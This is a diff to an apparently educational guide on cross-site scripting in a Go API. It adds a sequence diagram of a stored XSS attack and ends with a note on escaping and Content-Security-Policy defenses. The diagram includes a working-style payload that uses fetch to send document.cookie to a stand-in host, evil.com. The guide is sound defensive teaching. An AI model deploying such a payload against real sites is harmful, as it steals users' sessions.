@@ -19,6 +19,27 @@ User input "Hello" -> template -> "Hello" (safe text)
 User input "<script>bad()</script>" -> template -> "&lt;script&gt;bad()&lt;/script&gt;" (escaped text)
 ```
 
+## Visual model
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Attacker
+    actor Victim
+    participant Server as Go API Server
+    participant DB as Database
+
+    Attacker->>Server: POST /comments (Body: "<script>fetch('//evil.com?c='+document.cookie)</script>")
+    Server->>DB: Store unvalidated / unescaped string
+    Victim->>Server: GET /comments
+    Server->>DB: Fetch comments
+    Server-->>Victim: 200 OK with raw script tag in HTML response
+    Victim->>Victim: Browser executes script in Victim's session context!
+    Victim-->>Attacker: Cookie / Session Exfiltrated!
+
+    Note over Server, Victim: Go Defense: Context-aware HTML escaping (html/template) + Content-Security-Policy headers
+```
+
 ## Core idea
 
 XSS has three main types:
